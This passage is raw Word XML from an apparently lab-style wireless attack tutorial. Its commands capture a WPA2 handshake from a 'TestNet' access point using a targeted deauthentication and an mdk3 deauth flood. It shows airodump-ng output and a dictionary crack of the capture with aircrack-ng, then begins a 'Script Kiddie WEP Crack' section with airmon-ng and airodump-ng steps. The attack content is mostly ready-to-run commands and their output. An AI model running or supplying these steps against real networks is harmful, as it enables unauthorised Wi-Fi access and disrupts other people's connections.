        <w:t xml:space="preserve"> -0 1 -a 00:19:5B:52:AD:F7 -c 00:1C:BF:90:5B:A3 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3A8084"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
    <w:p w14:paraId="416116EE"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gramStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>mdk3</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon d –c 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B96D2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
    <w:p w14:paraId="189DFA1E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008274A1" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">As a result, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> should indicate “WPA Handshake:” in the upper right corner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F910F29"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CH </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>10 ]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">[ Elapsed: 2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>mins</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ 2009-02-21 13:04 ][ </w:t>
      </w:r>
      <w:r w:rsidRPr="00C01409">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>WPA handshake: 00:19:5B:52:AD:F7</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFF95E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3A276CA8"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PWR </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>RXQ  Beacons</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15802E7E"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718459D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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>:52:AD:F7</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  -33 100     1338       99    0  10  54   WPA2 CCMP   PSK  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>TestNet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D782EB3"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6A48AE2"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STATION            PWR   Rate   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Lost  Packets</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  Probe                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7170AB5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A69D4A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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>:52:AD:F7</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:1C:BF:90:5B:A3  -27  54-54      0      230 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1910501B"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Stop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> and make sure the files were created properly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DDE730"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FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>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FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2* -al</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FAEBEF"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35189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/wpa2-01.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3A2550"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476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/wpa2-01.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB640B6"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590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/wpa2-01.kismet.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDD4702" w14:textId="77777777" w:rsidR="002B0795"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rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FF9D6BE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="003112DC"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3112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>craclib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-small -b 00:19:5B:52:AD:F7 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB007A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
    <w:p w14:paraId="72222FDD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="249312EB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39498EEC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55FCCD7F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E647234" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E7E1267" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5594C744" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47AD7157" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63E1F730" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ED4CB72" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="748DBA8A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C3A3026" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F5610EC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03D415F7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A5B4B3E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B62714D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AA1607B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BFF096E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52198405" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37EAA376" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F8DB212" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39F52BF7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DA46AE4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Script Kiddie WEP Crack (10,000 IVs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A55D3B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DF68750" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00FD0ABD"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r w:rsidRPr="00FD0ABD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Airmon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FD0ABD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan1 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B1CAAD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60B914AE"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1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375B3C24"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w:t>
      </w:r>
      <w:r w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>irodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>--channel 1 wlan0mon --write channel1 –-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</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AP_mac_address</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="421EFE41"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3A0CE0E6"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2:</w:t>
      </w:r>
    </w:p>
